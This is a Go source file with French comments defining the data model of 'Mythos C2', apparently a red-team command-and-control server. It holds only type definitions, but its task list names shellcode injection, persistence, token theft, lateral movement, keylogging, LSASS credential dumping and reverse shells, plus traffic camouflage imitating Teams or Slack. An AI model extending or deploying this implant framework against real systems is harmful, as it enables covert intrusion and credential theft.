package models

import "time"

// ─────────────────────────────────────────────────────────────
// Agent — représente un implant actif sur une machine cible
// ─────────────────────────────────────────────────────────────
type Agent struct {
	ID          string    `json:"id"`           // UUID unique généré à l'enregistrement
	Hostname    string    `json:"hostname"`     // Nom de la machine cible
	Username    string    `json:"username"`     // Utilisateur courant (ex: CORP\alice)
	OS          string    `json:"os"`           // Windows 11 x64, etc.
	Arch        string    `json:"arch"`         // x64 / x86
	PID         int       `json:"pid"`          // PID du processus agent
	ProcessName string    `json:"process_name"` // Nom du processus hôte (ex: svchost.exe)
	InternalIP  string    `json:"internal_ip"`  // IP interne du réseau
	ExternalIP  string    `json:"external_ip"`  // IP publique (vue par le serveur)
	IsAdmin     bool      `json:"is_admin"`     // Droits administrateur
	Integrity   string    `json:"integrity"`    // Medium / High / SYSTEM
	Domain      string    `json:"domain"`       // Domaine AD si applicable
	SessionKey  []byte    `json:"-"`            // Clé AES-256 dérivée via ECDH (jamais exposée en JSON)
	FirstSeen   time.Time `json:"first_seen"`
	LastSeen    time.Time `json:"last_seen"`
	BeaconInt   int       `json:"beacon_interval"` // Intervalle de check-in en secondes
	Jitter      int       `json:"jitter"`           // % de variation aléatoire sur BeaconInt
	Status      string    `json:"status"`           // active / idle / dead
	ListenerID  string    `json:"listener_id"`      // Listener auquel l'agent est rattaché
	Tags        []string  `json:"tags"`             // Labels custom (ex: "dc", "workstation")
}

// ─────────────────────────────────────────────────────────────
// Task — une commande envoyée à un agent
// ─────────────────────────────────────────────────────────────
type Task struct {
	ID        string    `json:"id"`         // UUID de la tâche
	AgentID   string    `json:"agent_id"`   // Agent destinataire
	Type      TaskType  `json:"type"`       // Type de commande
	Payload   string    `json:"payload"`    // Arguments / données (chiffrées en transit)
	Status    string    `json:"status"`     // pending / sent / done / error
	CreatedAt time.Time `json:"created_at"`
	SentAt    time.Time `json:"sent_at"`
	DoneAt    time.Time `json:"done_at"`
	Result    string    `json:"result"`     // Résultat retourné par l'agent
	OperatorID string   `json:"operator_id"`
}

// TaskType — types de commandes supportées par Mythos C2
type TaskType string

const (
	TaskShell       TaskType = "shell"        // Exécuter une commande shell
	TaskPowerShell  TaskType = "powershell"   // Exécuter du PowerShell
	TaskUpload      TaskType = "upload"       // Uploader un fichier vers l'agent
	TaskDownload    TaskType = "download"     // Télécharger un fichier depuis l'agent
	TaskScreenshot  TaskType = "screenshot"   // Capture d'écran
	TaskProcList    TaskType = "proclist"     // Lister les processus
	TaskInject      TaskType = "inject"       // Injecter du shellcode dans un PID
	TaskMigrate     TaskType = "migrate"      // Migrer l'agent dans un autre processus
	TaskPersist     TaskType = "persist"      // Installer la persistance
	TaskSleep       TaskType = "sleep"        // Changer l'intervalle beacon
	TaskKill        TaskType = "kill"         // Terminer l'agent
	TaskTokenSteal  TaskType = "token_steal"  // Voler un token Windows
	TaskPortScan    TaskType = "portscan"     // Scan de ports interne
	TaskLateral     TaskType = "lateral"      // Mouvement latéral (SMB/WMI)
	TaskKeylog      TaskType = "keylog"       // Keylogger
	TaskClipboard   TaskType = "clipboard"    // Lire le presse-papiers
	TaskNetstat     TaskType = "netstat"      // Connexions réseau actives
	TaskEnvDump     TaskType = "envdump"      // Variables d'environnement
	TaskCDump       TaskType = "creddump"     // Dump credentials (SAM, LSASS)
	TaskRevShell    TaskType = "revshell"     // Reverse shell interactif
)

// ─────────────────────────────────────────────────────────────
// Listener — point d'écoute pour les agents
// ─────────────────────────────────────────────────────────────
type Listener struct {
	ID        string    `json:"id"`
	Name      string    `json:"name"`       // Nom custom (ex: "HTTPS-CDN-1")
	Type      string    `json:"type"`       // https / http / dns / smb
	Host      string    `json:"host"`       // IP ou domaine d'écoute
	Port      int       `json:"port"`
	Profile   string    `json:"profile"`    // Malleable profile associé
	TLSCert   string    `json:"tls_cert"`   // Chemin vers le certificat
	TLSKey    string    `json:"tls_key"`
	Active    bool      `json:"active"`
	CreatedAt time.Time `json:"created_at"`
	AgentCount int      `json:"agent_count"` // Nombre d'agents connectés
}

// ─────────────────────────────────────────────────────────────
// Operator — un membre de l'équipe Red Team
// ─────────────────────────────────────────────────────────────
type Operator struct {
	ID           string    `json:"id"`
	Username     string    `json:"username"`
	PasswordHash string    `json:"-"`         // bcrypt, jamais exposé
	Role         string    `json:"role"`      // admin / operator / viewer
	Token        string    `json:"token"`     // JWT actuel
	LastLogin    time.Time `json:"last_login"`
	CreatedAt    time.Time `json:"created_at"`
}

// ─────────────────────────────────────────────────────────────
// Beacon — paquet envoyé par l'agent au check-in
// ─────────────────────────────────────────────────────────────
// C'est le format du corps HTTP chiffré que l'agent envoie
// toutes les N secondes pour récupérer ses tâches
type Beacon struct {
	AgentID   string `json:"id"`
	Hostname  string `json:"h"`
	Username  string `json:"u"`
	PID       int    `json:"p"`
	IsAdmin   bool   `json:"a"`
	Integrity string `json:"i"`
	InternalIP string `json:"ip"`
}

// ─────────────────────────────────────────────────────────────
// BeaconResponse — réponse chiffrée du serveur à un agent
// ─────────────────────────────────────────────────────────────
type BeaconResponse struct {
	Tasks     []Task `json:"tasks"`      // Tâches en attente
	SleepTime int    `json:"sleep"`      // Prochain intervalle
	Jitter    int    `json:"jitter"`
	Kill      bool   `json:"kill"`       // Ordre de termination
}

// ─────────────────────────────────────────────────────────────
// TaskResult — résultat renvoyé par l'agent
// ─────────────────────────────────────────────────────────────
type TaskResult struct {
	TaskID  string `json:"task_id"`
	AgentID string `json:"agent_id"`
	Output  string `json:"output"`   // Sortie en base64 si binaire
	Error   string `json:"error"`
	Success bool   `json:"success"`
}

// ─────────────────────────────────────────────────────────────
// Event — log d'activité pour l'audit trail
// ─────────────────────────────────────────────────────────────
type Event struct {
	ID         string    `json:"id"`
	Type       string    `json:"type"`       // agent_checkin / task_created / task_done
	AgentID    string    `json:"agent_id"`
	OperatorID string    `json:"operator_id"`
	Message    string    `json:"message"`
	Timestamp  time.Time `json:"timestamp"`
}

// ─────────────────────────────────────────────────────────────
// MallableProfile — règles de camouflage du trafic réseau
// ─────────────────────────────────────────────────────────────
// Permet de faire ressembler le trafic C2 à du trafic légitime
// (ex: imiter le trafic de Microsoft Teams, Slack, etc.)
type MallableProfile struct {
	Name        string            `json:"name"`
	UserAgent   string            `json:"user_agent"`   // User-Agent HTTP à utiliser
	URIs        []string          `json:"uris"`         // URIs de check-in (rotations)
	Headers     map[string]string `json:"headers"`      // Headers HTTP supplémentaires
	BodyPadding int               `json:"body_padding"` // Padding aléatoire sur le body
	SSLPinning  bool              `json:"ssl_pinning"`  // Vérifier le cert côté agent
}

// ─────────────────────────────────────────────────────────────
// Constantes
// ─────────────────────────────────────────────────────────────
const (
	DefaultBeaconInterval = 60  // secondes
	DefaultJitter         = 20  // 20% de variation
	MaxTaskOutputSize     = 10 * 1024 * 1024 // 10 MB
)
